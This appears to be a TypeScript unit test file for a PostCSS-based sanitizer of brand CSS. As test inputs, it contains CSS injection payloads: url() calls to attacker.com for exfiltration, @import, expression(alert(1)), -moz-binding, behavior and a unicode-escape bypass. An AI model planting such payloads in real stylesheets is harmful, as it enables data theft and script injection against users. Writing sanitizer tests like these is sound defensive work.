/**
 * lib.brandCssSanitizer.spec.ts — Phase 81 Plan 03 (CSS-V116-02)
 *
 * Unit tests for sanitizeCssPostcss().
 * Covers every attack vector, legitimate-CSS preservation, and the
 * unicode-escape bypass that PostCSS canonicalizes at parse time.
 */
import { describe, it, expect } from "vitest";
import { sanitizeCssPostcss } from "../src/lib/brandCssSanitizer";

describe("sanitizeCssPostcss — attack vectors stripped", () => {
  it("strips url() declaration (exfiltration via background-image)", () => {
    const result = sanitizeCssPostcss("body { background: url(https://attacker.com?x=1) }");
    expect(result).not.toContain("url(");
  });

  it("strips @import at-rule but preserves subsequent rules", () => {
    const result = sanitizeCssPostcss("@import url('evil.css'); body { color: red; }");
    expect(result).not.toContain("@import");
    expect(result).toContain("color: red");
  });

  it("strips expression() IE JS execution vector", () => {
    const result = sanitizeCssPostcss("div { width: expression(alert(1)) }");
    expect(result).not.toContain("expression(");
  });

  it("strips @font-face but preserves sibling rules", () => {
    const result = sanitizeCssPostcss("@font-face { src: url(x) } button { color: blue }");
    expect(result).not.toContain("@font-face");
    expect(result).toContain("color: blue");
  });

  it("strips -moz-binding property (Gecko XSS)", () => {
    const result = sanitizeCssPostcss("a { -moz-binding: url(x.xml) }");
    expect(result).not.toContain("-moz-binding");
  });

  it("strips behavior property (IE)", () => {
    const result = sanitizeCssPostcss("div { behavior: url(evil.htc) }");
    // The property name is blocked and the whole decl is removed
    expect(result).not.toContain("behavior");
  });
});

describe("sanitizeCssPostcss — unicode-escape bypass neutralized", () => {
  it("u\\72l() unicode-escape bypass does not survive (PostCSS canonicalizes to url() at parse time)", () => {
    // PostCSS resolves the unicode escape u\72l → url during AST parse, so the
    // walker sees canonical url( and removes the declaration.
    const raw = "body { background: u\\72l(https://attacker.com) }";
    const result = sanitizeCssPostcss(raw);
    // Attacker host must not appear in the sanitized output
    expect(result).not.toContain("attacker.com");
  });
});

describe("sanitizeCssPostcss — legitimate CSS preserved", () => {
  it("preserves letter-spacing and var(--accent) custom property", () => {
    const result = sanitizeCssPostcss(
      "button { letter-spacing: 0.05em; color: var(--accent); }"
    );
    expect(result).toContain("letter-spacing");
    expect(result).toContain("var(--accent)");
  });

  it("preserves @keyframes (NOT in blocklist)", () => {
    const result = sanitizeCssPostcss(
      "@keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }"
    );
    expect(result).toContain("@keyframes");
    expect(result).toContain("transform");
  });
});

describe("sanitizeCssPostcss — edge cases", () => {
  it("returns empty string for empty input", () => {
    expect(sanitizeCssPostcss("")).toBe("");
  });

  it("returns empty string for invalid CSS (never throws)", () => {
    // Completely invalid CSS — PostCSS parse error path
    expect(() => sanitizeCssPostcss("}{ totally invalid")).not.toThrow();
    // May return empty string or best-effort parse; must not throw
    const result = sanitizeCssPostcss("}{ totally invalid");
    expect(typeof result).toBe("string");
  });

  it("caps input at 64 KB (DoS guard)", () => {
    // Input > 65536 bytes must be truncated before parse
    const big = "a".repeat(70_000);
    // Should not throw and should return within a reasonable time
    expect(() => sanitizeCssPostcss(big)).not.toThrow();
    const result = sanitizeCssPostcss(big);
    // Result must be at most 64KB-worth of content (chars)
    expect(result.length).toBeLessThanOrEqual(66_000); // generous upper bound
  });
});
